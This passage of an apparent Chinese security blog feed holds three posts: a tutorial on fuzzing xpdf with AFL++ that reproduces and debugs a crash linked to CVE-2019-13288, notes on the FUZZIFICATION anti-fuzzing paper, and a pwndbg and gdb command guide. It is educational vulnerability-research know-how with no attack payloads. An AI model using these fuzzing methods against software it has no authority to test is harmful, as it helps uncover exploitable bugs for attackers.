class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-keyword">make</span> distrib-<br>sudo <span class="hljs-keyword">make</span> install<br></code></pre></div></td></tr></table></figure><p>通过输入下面的命令可以查看afl-fuzz的具体命令参数</p><figure class="highlight ebnf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">afl-fuzz</span><br></code></pre></div></td></tr></table></figure><p>可以看到</p><p><img src="/posts/22ae87fa/image-20211201204851442.png" alt="image-20211201204851442"></p><h3 id="afl-fuzz命令格式"><a class="markdownIt-Anchor" href="#afl-fuzz命令格式"></a> <strong>afl-fuzz命令格式</strong></h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">afl-fuzz -i testcase_dir -o findings_dir -- <span class="hljs-regexp">/path/</span>to<span class="hljs-regexp">/tested/</span>program [...program<span class="hljs-string">&#x27;s cmdline...]</span><br></code></pre></div></td></tr></table></figure><p>用@@会自动替换为输入文件名</p><h3 id="afl-fuzz-基本参数说明"><a class="markdownIt-Anchor" href="#afl-fuzz-基本参数说明"></a> <strong>afl-fuzz 基本参数说明：</strong></h3><ul><li><p>-i：指定测试样本所在目录；</p></li><li><p>-o：指定测试结果存放目录；</p></li><li><p>-M：运行主(Master) Fuzzer；</p></li><li><p>-S：运行从属(Slave) Fuzzer；</p></li><li><p>-t：设置程序运行超时值，单位为 ms；</p></li><li><p>-m：最大运行内存，单位为 MB；</p></li><li><p>-s： 表示要使用的静态随机种子</p></li><li><p>@@ 占位符，AFL 将用每个输入文件名替换它</p></li></ul><p>更多参数信息可通过命令<code>afl-fuzz</code>来得知</p><h2 id="开始fuzzing"><a class="markdownIt-Anchor" href="#开始fuzzing"></a> 开始fuzzing</h2><p>前面说到，AFL从源码编译程序时进行插桩，以记录代码覆盖率。这个工作需要使用其提供的两种编译器的wrapper编译目标程序，和普通的编译过程没有太大区别</p><p>首先，我们清理所有以前编译的目标文件和可执行文件：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">rm -r <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<br>cd <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>xpdf-<span class="hljs-number">3.02</span>/<br>make clean<br></code></pre></div></td></tr></table></figure><p>现在我们开始用<strong>afl-clang-fast</strong> 用编译xpdf:</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros"><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">LLVM_CONFIG</span>=<span class="hljs-string">&quot;llvm-config-11&quot;</span><br><span class="hljs-attribute">CC</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast <span class="hljs-attribute">CXX</span>=<span class="hljs-variable">$HOME</span>/AFLplusplus/afl-clang-fast++ ./configure <span class="hljs-attribute">--prefix</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/fuzzing_xpdf/install/&quot;</span><br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>现在我们可以就可以用下面的命令开始fuzzing了</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">afl-fuzz -i <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>pdf_examples<span class="hljs-regexp">/ -o $HOME/</span>fuzzing_xpdf<span class="hljs-regexp">/out/</span> -s <span class="hljs-number">123</span> -- <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext @@ <span class="hljs-variable">$HOME</span><span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></div></td></tr></table></figure><p>对于每个输入文件，the fuzzer都会执行下面的命令</p><p><code>$HOME/fuzzing_xpdf/install/bin/pdftotext &lt;input-file-name&gt; $HOME/fuzzing_xpdf/output</code></p><blockquote><p>如果遇到错误 <strong><em>“Hmm, your system is configured to send core dump notifications to an external utility…”</em>,</strong></p><p>这是因为在执行<code>afl-fuzz</code>前，如果系统配置为将核心转储文件（core）通知发送到外部程序。 将导致将崩溃信息发送到Fuzzer之间的延迟增大，进而可能将崩溃被误报为超时，所以我们得临时修改<code>core_pattern</code>文件，如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo su<br>echo core &gt;<span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/kernel/</span>core_pattern<br><span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure></blockquote><p>成功开始fuzzing后我们可以看到下面的界面</p><p><img src="/posts/22ae87fa/image-20211201154932423.png" alt="image-20211201154932423"></p><p>等待……三个多小时后终于出现了一个crash</p><p><img src="/posts/22ae87fa/image-20211201201505518.png" alt="image-20211201201505518"></p><h2 id="crash复现"><a class="markdownIt-Anchor" href="#crash复现"></a> crash复现</h2><p>在$HOME/fuzzing_xpdf/out/文件夹下我们可以我们的crash</p><p><img src="/posts/22ae87fa/image-20211201201841167.png" alt="image-20211201201841167"></p><p>用这个crash作为input来进行复现</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">/home/zino/fuzzing_xpdf/install/bin/pdftotext &#x27;/home/zino/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001820,time:12475087,op:havoc,rep:8&#x27; /home/zino/fuzzing_xpdf/output<br></code></pre></div></td></tr></table></figure><p><img src="/posts/22ae87fa/image-20211201202149422.png" alt="image-20211201202149422"></p><p>可以看到，这个crash会导致段错误并导致程序崩溃。</p><p>我们用gdb来调试一下，看一下原因</p><p>首先需要清除原先的二进制文件，重新构建xpdf以加入调试信息</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">rm -r $HOME/fuzzing_xpdf/install<br>cd $HOME/fuzzing_xpdf/xpdf-3.02/<br>make clean<br>CFLAGS=&quot;-g -O0&quot; CXXFLAGS=&quot;-g -O0&quot; ./configure --prefix=&quot;$HOME/fuzzing_xpdf/install/&quot;<br>make<br>make install<br></code></pre></div></td></tr></table></figure><p>然后就可以用GDB调试了</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">gdb --args <span class="hljs-regexp">/home/</span>zino<span class="hljs-regexp">/fuzzing_xpdf/i</span>nstall<span class="hljs-regexp">/bin/</span>pdftotext <span class="hljs-string">&#x27;/home/zino/fuzzing_xpdf/out/default/crashes/id:000000,sig:11,src:001820,time:12475087,op:havoc,rep:8&#x27;</span> <span class="hljs-regexp">/home/</span>zino<span class="hljs-regexp">/fuzzing_xpdf/</span>output<br></code></pre></div></td></tr></table></figure><p>首先r</p><p>然后卡住后我们用bt(backtrace)回溯</p><p>可以看到getObj函数被反复递归调用，这个漏洞被记录为<a href="https://www.cvedetails.com/cve/CVE-2019-13288/">CVE-2019-13288</a></p><p>原因是在 Xpdf 4.01.01 中，<a href="http://Parser.cc">Parser.cc</a> 中的 Parser::getObj() 函数可能会通过精心制作的文件导致无限递归。远程攻击者可以利用它进行 DoS 攻击。</p><p><img src="/posts/22ae87fa/image-20211201203904689.png" alt="image-20211201203904689"></p><p>参考链接：</p><p><a href="https://paper.seebug.org/841/#1-afl-gcc">AFL 漏洞挖掘技术漫谈（一）：用 AFL 开始你的第一次 Fuzzing</a></p><p><a href="https://github.com/antonio-morales/Fuzzing101/tree/main/Exercise%201">fuzzing101-exercise1</a></p>]]></content>
    
    
    <categories>
      
      <category>Fuzz</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>论文笔记：《FUZZIFICATION:Anti-Fuzzing Techniques》</title>
    <link href="/posts/5dd98acd/"/>
    <url>/posts/5dd98acd/</url>
    
    <content type="html"><![CDATA[<h2 id="一-前言"><a class="markdownIt-Anchor" href="#一-前言"></a> 一、前言</h2><p>Fuzzing是一种软件测试技术，它可以在不了解程序内部结构的情况下快速、自动地探索程序的输入空间。</p><p>它即方便了测试人员检测漏洞，但这意味着也可以被恶意攻击者使用以发现0day漏洞。</p><p>因此，开发人员希望在其产品上应用反模糊技术以阻止攻击者进行模糊测试，其概念类似于使用混淆技术削弱逆向工程。</p><p>在本文中，作者提出了一种二进制保护的新方向，称为FUZZIFICATION。攻击者仍然可以从受FUZZIFICATION保护的二进制文件中查找错误，但<strong>需要花费更多的精力</strong>（例如，CPU，内存和时间）。因此，获得原始二进制文件的开发人员或其他受信任方能够在攻击者之前检测程序错误并合成补丁。</p><h2 id="二-fuzzification简介"><a class="markdownIt-Anchor" href="#二-fuzzification简介"></a> 二、Fuzzification简介</h2><p><code>Fuzzification</code>帮助开发人员保护已发布的纯二进制软件能够免受应用最先进模糊技术的攻击者的侵害。在给定性能预算的情况下，这种方法旨在尽可能地阻止对手的模糊测试过程。</p><p><a href="https://www.usenix.org/system/files/sec19fall_jung_prepub.pdf">论文《FUZZIFICATION: Anti-Fuzzing Techniques》pdf下载</a></p><p><a href="https://github.com/sslab-gatech/fuzzification">github地址</a></p><h3 id="技术组件"><a class="markdownIt-Anchor" href="#技术组件"></a> 技术组件</h3><p>其目前包括三个技术组件：</p><ul><li><strong>SpeedBump</strong>：将正常执行的减速放大数百倍到模糊执行，从而降低fuzzing效率。<ul><li>注入<strong>延迟</strong>到正常执行很少到达，但模糊执行经常访问的冷路径。</li></ul></li><li><strong>BranchTrap</strong>：通过隐藏路径和污染覆盖图来干扰反馈逻辑。<ul><li>在程序中插入大量对输入敏感的跳转，因此任何输入变化都会显著地改变执行路径。这将促使基于覆盖率反馈的fuzzing工具将精力花在注入的无bug路径上，而不是真正的路径上。</li></ul></li><li><strong>AntiHybrid</strong>：阻碍污点分析和符号执行。<ul><li>反混合技术的目的是阻止将传统的模糊方法与动态污染分析和符号执行相结合的混合模糊方法。</li></ul></li></ul><p>每一种技术都设计了有效的防御措施，试图阻止敌人绕过FUZZIFICATION。</p><h3 id="应用流程"><a class="markdownIt-Anchor" href="#应用流程"></a> 应用流程</h3><p><img src="/posts/5dd98acd/image-20211202105624895.png" alt="image-20211202105624895"></p><p>开发人员使用FUZZIFICATION技术创建一个受保护的二进制文件并将其发布给公众。同时，它们将正常编译的二进制文件发送给受信任的一方。攻击者无法通过fuzzing从受保护的二进制文件中找到很多bug，而受信任的一方可以有效地发现更多的bug，从而使得开发人员可以及时修补它们。</p><h2 id="三-设计概述"><a class="markdownIt-Anchor" href="#三-设计概述"></a> 三、设计概述</h2><p><img src="/posts/5dd98acd/image-20211202110549083.png" alt="fuzzification工作流程的概述"></p><ul><li><p>它将<strong>程序源代码</strong>、<strong>一组常用的测试用例</strong>和<strong>开销预算</strong>作为输入，并生成一个由fuzzification技术保护的二进制文件。</p><blockquote><p>请注意，fuzzification依赖于开发人员确定适当的开销预算，这需要在产品的功能和安全性之间取一个平衡。</p></blockquote></li></ul><ol><li><p>我们编译程序来生成一个正常的二进制文件，并用给定的正常测试用例来运行它来收集基本的块频率。频率信息告诉我们哪些基本块很少被正常的执行使用。</p></li><li><p>这个概要文件的基础上，我们将三种fuzzification技术应用到程序中，并生成一个临时的受保护二进制文件。</p></li><li><p>我们再次用给定的正常测试用例来测量临时二进制文件的开销。如果开销超过了开销预算，我们返回到<strong>步骤2</strong>，以减少程序的速度降低程度，例如使用更短的延迟和添加更少的仪器。如果开销远低于预算，我们就相应地增加开销。</p></li><li><p>否则，我们生成受保护的二进制文件。</p></li></ol><h3 id="speedbump"><a class="markdownIt-Anchor" href="#speedbump"></a> SpeedBump</h3><p><strong>功能：减缓fuzzing的速度，同时最小化对正常执行的影响。</strong></p><blockquote><p>模糊执行过程中经常陷入正常执行很少访问的路径，例如wrong MAGIC等路径。我们称之为冷路径。</p></blockquote><p>在<strong>冷路径</strong>中注入<strong>延迟</strong>将显著降低模糊执行的速度，但不会对常规执行产生太大影响。该文首先用给定的测试用例从正常执行中识别冷路径，然后将精心设计的延迟注入到最少执行的代码路径中，fuzzification会自动确定注入延迟的代码路径数量和每个延迟的长度，以便在正常执行期间，受保护的二进制文件的开销满足用户定义的开销预算。</p><h4 id="1-基本块频率分析"><a class="markdownIt-Anchor" href="#1-基本块频率分析"></a> 1. 基本块频率分析</h4><p>fuzzification生成一个基本块频率分析概要来识别冷路径。</p><p>分析过程遵循三个步骤。</p><ul><li>首先，我们检测目标程序来计算在执行过程中访问的基本块，并生成用于分析的二进制文件。</li><li>其次，使用用户提供的测试用例，我们运行这个二进制文件并收集每个输入访问的基本块。</li><li>第三，FUZZIFICATION对收集到的信息进行分析，以识别有效输入很少执行或从未执行的基本块。这些块在延迟注入中被视为冷路径。</li></ul><h4 id="2-可配置的延迟注入"><a class="markdownIt-Anchor" href="#2-可配置的延迟注入"></a> 2. 可配置的延迟注入</h4><p>重复执行以下两个步骤，以确定要<strong>注入延迟</strong>的代码块和<strong>每个延迟的长度</strong>:</p><ul><li>首先在测试执行中注入30ms的延迟到最少执行的基本块的3%。该文作者发现这个设置非常接近最终的评估结果。</li><li>测量生成的二进制代码的开销。如果它没有超过用户定义的开销预算，我们就进入上一步，将更多的延迟注入到更多的基本块中。否则，我们使用前一轮的延迟作为最终结果。我们的speedbumptechnical是特别有用的开发人员一般有一个很好的理解他们的应用程序，以及对fuzzification的要求。</li></ul><p>作者提供了5个选项，开发者可以使用它们来微调SpeedBump的效果。</p><ul><li><code>MAX_OVERHEAD</code>定义了开销预算。开发人员可以指定任何值，只要他们对开销感到满意。</li><li><code>DELAY_LENGTH</code>指定延迟的范围。</li><li><code>INCLUDE_INCORRECT</code>决定是否将延迟注入错误处理基本块(即，只有无效输入执行的位置)，这是默认启用的。</li><li><code>INCLUDE_NON_EXEC</code> and <code>NON_EXEC_RATIO</code>指定是否注入延迟到有多少基本块在测试执行过程中从未执行。当开发人员没有大量的测试用例时，这很有用。</li></ul><h4 id="3-抗分析延迟原语"><a class="markdownIt-Anchor" href="#3-抗分析延迟原语"></a> 3. 抗分析延迟原语</h4><p>由于攻击者可能使用程序分析来识别和删除简单的延迟原语(例如，sleep)，作者设计了包含算术操作并与原始代码库相联系的健壮原语。</p><p>作者设计的原语是基于csmith的，<strong>它可以生成随机的、无bug的代码片段</strong>。例如，CSmith可以生成一个函数，该函数接受参数，执行算术操作，并返回特定类型的值。修改了csmith使其生成的代码具有对原始代码的数据依赖和代码依赖。具体来说，就是将原始代码中的一个变量作为参数传递给生成的代码，从生成的代码中引用原始代码，并使用返回值修改原始代码的一个全局变量。</p><p>图5显示了延迟原语的一个示例。它声明了一个局部变量pass_var和并修改全局变量global_var1和global_var2。通过这种方式，作者引入了原始代码和注入代码(第6、9和12行)之间的数据流依赖关系，并在不影响原始程序的情况下更改程序状态。尽管代码是随机生成的，但它通过数据流和控制流依赖关系与原始代码紧密耦合。</p><p><img src="/posts/5dd98acd/image-20211202205833884.png" alt="image-20211202205833884"></p><h3 id="branchtrap"><a class="markdownIt-Anchor" href="#branchtrap"></a> BranchTrap</h3><p><strong>功能：通过隐藏路径和污染覆盖图来干扰反馈逻辑</strong></p><p>代码覆盖率信息被模糊器广泛用于寻找感兴趣的输入并对其进行排序。如果可以插入大量的条件分支，这些分支的条件对微小的输入变化很敏感，那么就可以让这些模糊器勤奋地工作。当模糊过程陷入这些分支陷阱时，基于覆盖率反馈的模糊器将浪费他们的资源去探索(大量)毫无价值的路径。因此，作者提出了一种通过误导或阻断覆盖率反馈来欺骗基于覆盖率反馈的fuzz工具的技术。</p><h4 id="制造大量的条件分支和间接跳转"><a class="markdownIt-Anchor" href="#制造大量的条件分支和间接跳转"></a> 制造大量的条件分支和间接跳转</h4><ul><li><p><code>BranchTrap</code><strong>第一种方法</strong>是<strong>制造大量的条件分支和间接跳转</strong>，并将它们注入到原始程序中。</p><p>每个虚构的条件分支都依赖于一些输入字节来决定是否接受分支，而间接跳转则基于用户输入计算它们的目标。</p><p>因此，即使输入稍有变化，程序也会采用不同的执行路径。一旦模糊执行触发伪造的分支，模糊器将设置一个更高的优先级来突变其输入，导致检测更多的假路径。通过这种方式，fuzzer将继续浪费它的资源(例如，CPU和内存)去检查没有结果但没有bug的假路径。</p><p>为了有效地诱导聚焦于假分支的模糊器，作者考虑了以下四个<strong>设计方面</strong>：</p><ul><li>首先，BranchTrap应该制造足够数量的假路径来影响模糊策略。由于模糊器会从一个有趣的输入产生各种不同的变量，假路径应该提供不同的覆盖范围，并直接受到输入的影响，以便模糊器继续挖掘陷阱。</li><li>其次，注入的新路径给常规执行带来最小的开销。</li><li>第三，branchtrap中的路径对于用户输入应该是确定性的，这意味着相同的输入应该经过相同的路径。原因是一些模糊器可以检测并忽略非确定性路径(例如，AFL忽略一个输入，如果两个输入执行采用不同的路径)。</li><li>最后，branchtrap不能被对手轻易地识别或删除。</li></ul><p>BranchTrap的<strong>一个简单实现</strong>是注入一个<strong>跳转表</strong>，并使用一些输入字节作为访问该表的索引。为了强化BranchTrap，作者根据用户输入使每个注入的分支的返回地址多样化。受ROP的启发：通过链接各种小的代码段，将现有代码重用于恶意攻击。作者的方法可能会严重扭曲CFG(control flow graph)，使取消BranchTrap更具挑战性。</p><p>实施过程分为三个<strong>步骤</strong>：</p><ul><li><p>首先，BranchTrap从程序汇编代码中收集函数结尾（function epilogues）。</p></li><li><p>其次，将具有相同指令序列的函数结尾分组到一个跳转表中</p></li><li><p>第三，重写程序集，以便该函数使用一些输入字节作为跳转表索引，从相应的跳转表中检索几个等效的结尾，以实现原始函数的返回。</p></li></ul><p>基于ROP的BranchTrap具有三个<strong>优点</strong>：</p><ul><li>Effective：控制流与用户输入突变一起不断敏感地变化从而<strong>引入足够数量的无效路径</strong>，使coverage feedback效果降低。且BranchTrap<strong>保证路径确定性</strong>，从而使fuzzer不会忽略这些伪造路径。</li><li>Low overhead：轻量级的操作（XOR；解析跳转地址；跳转到gadget）为普通用户造成的开销低。</li><li>Robust：基于ROP的设计大大增加了对手识别或修补二进制文件的复杂性。</li></ul><p><img src="/posts/5dd98acd/image-20211202213546213.png" alt="image-20211202213546213"></p></li></ul><h4 id="饱和模糊状态"><a class="markdownIt-Anchor" href="#饱和模糊状态"></a> 饱和模糊状态</h4><ul><li><p>BranchTrap的<strong>第二种方法</strong>是<strong>饱和模糊状态</strong>，这将阻止模糊器学习代码覆盖的进展。</p><p>与诱导模糊器聚焦于无结果的输入的第一种方法不同，这里的目标是防止模糊器发现真正有趣的输入。为了实现这一目标，branchtrap插入大量的分支到程序中，并利用每个模糊器的覆盖表示机制来掩盖新的发现。</p><p>BranchTrap能够为一些很少有人访问的基本块引入大量（例如1万到10万）确定性分支。一旦fuzzer到达这些基本块，其覆盖范围表将迅速填满。在之后执行中大多数新发现的路径将被视为已访问，因此fuzzer将忽略实际有趣的输入。例如，AFL维护一个固定大小的位图(即64KB)来跟踪边缘覆盖。通过插入大量不同的分支，显著增加了位图碰撞的概率，从而降低了覆盖率的不准确性</p></li></ul><h3 id="antihybrid"><a class="markdownIt-Anchor" href="#antihybrid"></a> AntiHybrid</h3><p><strong>功能：阻碍污点分析和符号执行。</strong></p><p><strong>符号执行简介</strong></p><blockquote><ul><li><p>符号执行的关键思想就是，使用符号值来代替具体变量，来模拟每个路径来产生每一个执行的可能性，将执行语句的结果整合成若干条数学表达式。对某结果的数学表达式进行求解，就能获得到达该结果的路径。</p><p><img src="/posts/5dd98acd/image-20211202214447655.png" alt="image-20211202214447655"></p><p><img src="/posts/5dd98acd/image-20211202214454348.png" alt="image-20211202214454348"></p></li></ul></blockquote><p><strong>污点分析简介</strong></p><blockquote><p>污点分析可以抽象成一个三元组&lt;sources,sinks,sanitizers&gt;的形式,其中,</p><ul><li><p>source 即污点源,代表直接引入不受信任的数据或者机密数据到系统中;</p></li><li><p>sink即污点汇聚点,代表直接产生安全敏感操作(违反数据完整性)或者泄露隐私数据到外界(违反数据保密性);</p></li><li><p>sanitizer即无害处理,代表通过数据加密或者移除危害操作等手段使数据传播不再对软件系统的信息安全产生危害.</p></li></ul><p><img src="/posts/5dd98acd/image-20211202214657941.png" alt="image-20211202214657941"></p><p>污点分析就是分析程序中由污点源引入的数据是否能够不经无害处理,而直接传播到污点汇聚点</p></blockquote><p>混合模糊测试方法利用符号执行或动态污点分析来提高模糊测试效率。然而，<strong>混合方法具有众所周知的弱点</strong>：</p><ul><li><p>符号执行和污点分析都消耗大量资源，从而限制了它们分析简单程序的能力。</p></li><li><p>符号执行受到<strong>路径爆炸</strong>问题的限制。如果处理符号需要复杂的操作，则符号执行引擎必须详尽地探索和评估所有执行状态。而且大多数符号执行引擎都无法运行到执行路径的末尾。</p><blockquote><p><img src="/posts/5dd98acd/image-20211202214851909.png" alt="image-20211202214851909"></p></blockquote></li><li><p><strong>DTA</strong>(动态符号执行)分析难以跟踪隐式数据依赖性。例如，为覆盖通过控制通道的数据依赖性，DTA必须在有条件分支之后将taint属性主动传播到任何变量，从而使分析更昂贵而结果不太准确</p></li></ul><h4 id="引入隐式数据流依赖关系"><a class="markdownIt-Anchor" href="#引入隐式数据流依赖关系"></a> 引入隐式数据流依赖关系</h4><p>作者将原始程序中的显式数据流<strong>转换为隐式数据流</strong>，以阻碍污染分析。</p><p>fuzzification首先识别分支条件和有趣的信息sink(例如，strcmp)，然后根据变量类型注入数据流转换代码。</p><p>下图显示了antihybrid的一个示例应用程序，其中<code>array input</code>用于确定分支条件，而strcmp是一个有趣的sink函数。因此，fuzzification使用隐式数据流复制数组(第6-15行)并将原始变量替换为新变量(第16行)。由于转换后的隐式数据流，DTA技术不能识别影响第16行分支条件的正确输入字节。</p><p><img src="/posts/5dd98acd/image-20211202215315995.png" alt="image-20211202215315995"></p><h4 id="爆炸路径约束"><a class="markdownIt-Anchor" href="#爆炸路径约束"></a> 爆炸路径约束</h4><p>为了阻止使用符号执行的混合模糊器，fuzzification注入多个代码块来有意地触发路径爆炸。</p><p>具体来说，通过比较原始操作数的<strong>哈希值</strong>来替换每个比较指令。采用哈希函数是因为符号执行<strong>无法轻松确定</strong>具有给定哈希值的<strong>原始操作数</strong>。由于哈希函数通常会在程序执行中引入不可忽略的开销，因此作者利用轻量级的循环冗余校验（CRC）循环迭代来转换分支条件以减少性能开销。</p><p><img src="/posts/5dd98acd/image-20211202215806017.png" alt="image-20211202215806017"></p>]]></content>
    
    
    <categories>
      
      <category>Paper Note</category>
      
    </categories>
    
    
    <tags>
      
      <tag>fuzz</tag>
      
      <tag>论文笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwndbg的安装和gdb使用</title>
    <link href="/posts/eda6b4df/"/>
    <url>/posts/eda6b4df/</url>
    
    <content type="html"><![CDATA[<h2 id="一-pwndbg安装"><a class="markdownIt-Anchor" href="#一-pwndbg安装"></a> 一、pwndbg安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs terminal">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></div></td></tr></table></figure><p>然后我们可以查看.gdbinit中的内容</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">cat <span class="hljs-string">.gdbinit</span><br></code></pre></div></td></tr></table></figure><p><img src="/posts/eda6b4df/image-20211201173406772.png" alt="image-20211201173406772"></p><p>如何之前没有安装过别的插件，则只会显示有最后一行，如果安装过，则将前面的注释掉即可</p><p>插件功能都差不多，选择一个即可，倒也不必每个都装。最后选了pwndbg单纯觉得好看。</p><p>pwndbg基本界面如图：</p><p><img src="/posts/eda6b4df/image-20211201173706711.png" alt="image-20211201173706711"></p><h2 id="二-gdb的使用"><a class="markdownIt-Anchor" href="#二-gdb的使用"></a> 二、gdb的使用</h2><h3 id="基本指令"><a class="markdownIt-Anchor" href="#基本指令"></a> 基本指令</h3><ul><li><code>help</code> //帮助</li><li><code>i</code> //info，查看一些信息，只输入info可以看可以接什么参数，下面几个比较常用<ul><li><code>i b</code> //<strong>常用</strong>，info break 查看所有断点信息（编号、断点位置）</li><li><code>i r</code> //<strong>常用</strong>，info registers 查看各个寄存器当前的值</li><li><code>i f</code> //info function 查看所有函数名，需保留符号</li></ul></li><li><code>show</code> //和info类似，但是查看调试器的基本信息，如：<ul><li>show args //查看参数</li></ul></li><li><code>rdi</code> //<strong>常用</strong>，+寄存器名代表一个寄存器内的值，用在地址上直接相当与一个十六进制变量</li><li><code>backtrace</code> //查看调用栈</li><li><code>q</code> //quit 退出，常用</li></ul><h3 id="执行指令"><a class="markdownIt-Anchor" href="#执行指令"></a> 执行指令</h3><ul><li><code>s</code> //s<strong>单步步入</strong>，遇到调用跟进函数中，相当于step into，源码层面的一步</li><li><code>si</code> //<strong>常用</strong>，同s，汇编层面的一步</li><li><code>n</code> //next,<strong>单步补过</strong>，遇到调用不跟进，相当于step over，源码层面的一步</li><li><code>ni</code> //nexti,<strong>常用</strong>，同n，汇编层面的一步</li><li><code>c</code> //continue，常用，继续执行到断点，没断点就一直执行下去</li><li><code>r</code> //run，常用，重新开始执行</li><li><code>finish</code>//finish,运行直到当前函数返回</li></ul><h3 id="断点指令"><a class="markdownIt-Anchor" href="#断点指令"></a> 断点指令</h3><h4 id="下普通断点指令bbreak"><a class="markdownIt-Anchor" href="#下普通断点指令bbreak"></a> <strong>下普通断点指令b(break)：</strong></h4><ul><li><code>b *(0x123456)</code> //<strong>常用</strong>，给0x123456地址处的指令下断点<ul><li>b *$ rebase(0x123456) //$rebase 在调试开PIE的程序的时候可以直接加上程序的随机地址</li></ul></li><li><code>b function_name</code> //<strong>常用</strong>，给函数fun_name下断点，目标文件要保留符号才行</li><li><code>b file_name:fun_name</code></li><li><code>b file_name:15</code> //给file_name的15行下断点，要有源码才行<ul><li><code>b 15</code>//单个文件的第15行</li></ul></li><li><code>b +0x10</code> //在程序当前停住的位置下0x10的位置下断点，同样可以-0x10，就是前0x10</li><li><code>break fun if \$rdi==5</code> //条件断点，rdi值为5的时候才断</li></ul><h4 id="删除-禁用断点"><a class="markdownIt-Anchor" href="#删除-禁用断点"></a> <strong>删除、禁用断点：</strong></h4><p>使用info break(简写: i b)来查看断点编号</p><ul><li><code>delete 5</code> //<strong>常用</strong>，删除5号断点，直接delete不接数字删除所有</li><li><code>disable 5</code> //<strong>常用</strong>，禁用5号断点</li><li><code>enable 5</code> //启用5号断点</li><li><code>clear</code> //不加参数默认清除当前函数所在行的所有断点<ul><li><code>clear function</code>//删除该函数内的所有断点</li><li><code>clear line</code>//删除该行的所有断点</li></ul></li></ul><h4 id="内存断点指令watch"><a class="markdownIt-Anchor" href="#内存断点指令watch"></a> <strong>内存断点指令watch：</strong></h4><ul><li><code>watch 0x123456</code> //0x123456地址的数据改变的时候会断</li><li><code>watch a</code> //变量a改变的时候会断</li><li><code>info watchpoints</code> //查看watch断点信息</li></ul><h4 id="捕获断点catch"><a class="markdownIt-Anchor" href="#捕获断点catch"></a> <strong>捕获断点catch：</strong></h4><ul><li><code>catch syscall</code> //syscall系统调用的时候断住</li><li><code>tcatch syscall</code> //syscall系统调用的时候断住，只断一次</li><li><code>info break</code> //catch的断点可以通过i b查看</li></ul><blockquote><p>除syscall外还可以使用的有：</p><p>1）throw: 抛出异常</p><p>2）catch: 捕获异常</p><p>3）exec: exec被调用</p><p>4）fork: fork被调用</p><p>5）vfork: vfork被调用</p><p>6）load: 加载动态库</p><p>7）load libname: 加载名为libname的动态库</p><p>8）unload: 卸载动态库</p><p>9）unload libname: 卸载名为libname的动态库</p><p>10）syscall [args]: 调用系统调用，args可以指定系统调用号，或者系统名称</p></blockquote><h3 id="打印指令"><a class="markdownIt-Anchor" href="#打印指令"></a> 打印指令</h3><h4 id="查看内存指令x"><a class="markdownIt-Anchor" href="#查看内存指令x"></a> <strong>查看内存指令x：</strong></h4><ul><li><p><code>x /nuf 0x123456</code> //<strong>常用</strong>，x指令的格式是：x空格/nfu，nfu代表三个参数</p><ul><li>n代表显示几个单元（而不是显示几个字节，后面的u表示一个单元多少个字节），放在’/'后面</li><li>u代表一个单元几个字节，b(一个字节)，h(二个字节)，w(四字节)，g(八字节)</li><li>f代表显示数据的格式，f和u的顺序可以互换，也可以只有一个或者不带n，用的时候很灵活<ul><li>x 按十六进制格式显示变量。<br>d 